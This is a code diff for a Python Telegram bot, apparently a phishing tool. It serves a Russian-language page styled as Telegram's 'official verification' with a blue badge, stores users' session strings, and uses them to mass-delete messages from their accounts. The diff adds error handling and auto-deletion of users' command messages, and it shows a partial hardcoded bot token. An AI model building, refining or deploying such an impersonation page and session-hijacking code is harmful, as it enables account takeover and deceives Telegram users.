@@ -15,7 +15,6 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "8828318815:AAEJ63XFWpwwuigCWuO_-Hu94sJVyhgn3
 
 active_sessions = {}
 
-# واجهة توثيق تيليجرام الرسمية باللغة الروسية والشارة الزرقاء
 WEB_APP_HTML = """
 <!DOCTYPE html>
 <html lang="ru">
@@ -31,7 +30,7 @@ WEB_APP_HTML = """
         .avatar { width: 80px; height: 80px; background: #2b5278; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; color: #fff; font-weight: bold; }
         .blue-badge { position: absolute; bottom: 0; right: 0; background: #2481cc; width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid #17212b; }
         .blue-badge svg { width: 14px; height: 14px; fill: #fff; }
-        h3 { color: #fff; margin: 10px 0 5px 0; font-size: 18px; display: flex; align-items: center; justify-content: center; gap: 5px; }
+        h3 { color: #fff; margin: 10px 0 5px 0; font-size: 18px; }
         p { color: #829ba7; font-size: 13px; margin-bottom: 20px; line-height: 1.4; }
         input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #2b3847; background: #18222d; color: #fff; font-size: 15px; text-align: center; outline: none; }
         input:focus { border-color: #2481cc; }
@@ -81,7 +80,7 @@ WEB_APP_HTML = """
                         }
                     });
                 }
-            }, 600);
+            }, 500);
         };
 
         function callApi(action, value) {
@@ -114,6 +113,9 @@ WEB_APP_HTML = """
                             <button onclick="location.reload()">Повторить</button>`;
                 }
                 document.getElementById('content').innerHTML = html;
+            })
+            .catch(err => {
+                document.getElementById('content').innerHTML = `<p class="msg">Ошибка соединения с сервером.</p><button onclick="location.reload()">Повторить</button>`;
             });
         }
 
@@ -206,8 +208,14 @@ def api():
 
     return {"status": "error", "message": "Неизвестный запрос"}
 
-# --- أوامر البوت بالزر الروسى الاحترافي ---
+# --- أوامر البوت مع حذف رسالة المستخدم فور إرسالها ---
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # محاولة حذف رسالة أمر /start لتنظيف الشات
+    try:
+        await update.message.delete()
+    except Exception:
+        pass
+
     web_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
     if not web_url.startswith('http'):
         web_url = f"https://{web_url}"
@@ -221,6 +229,11 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        await update.message.delete()
+    except Exception:
+        pass
+
     user_id = str(update.effective_user.id)
     session_data = active_sessions.get(user_id)
 
@@ -232,7 +245,7 @@ async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_
     limit = int(args[0]) if args and args[0].isdigit() else 100
     chat = update.effective_chat
 
-    await update.message.reply_text(f"⏳ Удаление последних {limit} сообщений...")
+    status_msg = await update.message.reply_text(f"⏳ Удаление последних {limit} сообщений...")
 
     try:
         session_str = session_data['session_str']
@@ -249,9 +262,9 @@ async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_
                 pass
 
         await client.disconnect()
-        await update.message.reply_text(f"✅ Успешно удалено сообщений: {deleted_count}")
+        await status_msg.edit_text(f"✅ Успешно удалено сообщений: {deleted_count}")
     except Exception as e:
-        await update.message.reply_text(f"❌ Ошибка: {e}")
+        await status_msg.edit_text(f"❌ Ошибка: {e}")
 
 def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), use_reloader=False)
@@ -265,6 +278,6 @@ if __name__ == '__main__':
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(CommandHandler("delet", delete_messages_command))
     
-    print("Fokhm Russian Verification Bot is running...")
+    print("Fokhm Russian Verification Bot is running perfectly...")
     application.run_polling()
 
